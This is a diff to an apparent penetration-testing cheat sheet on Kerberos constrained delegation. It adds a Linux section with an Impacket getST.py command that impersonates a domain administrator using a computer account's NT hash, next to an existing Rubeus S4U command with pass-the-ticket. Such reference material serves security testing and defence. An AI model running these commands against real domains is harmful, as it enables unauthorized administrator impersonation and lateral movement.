@@ -50,6 +50,11 @@ In this case, it is not possible to use S4U2self to obtain a forwardable ST for 
 
     Rubeus s4u /ticket:TICKET /impersonateuser:ADMIN_USER /msdsspn:SPN_CONTRAINED /altservice:CIFS /ptt (Choose the altservice below to use with rubeus)
 
+## Linux
+
+    getST.py -spn 'cifs/target.domain.local' -impersonate administrator -hashes ':<computer_NThash>' -dc-ip <DC_IP> domain.local/computer
+    export KRB5CCNAME=./Administrator.ccache
+
 ### Altservice:
 
 #### 1) HOST
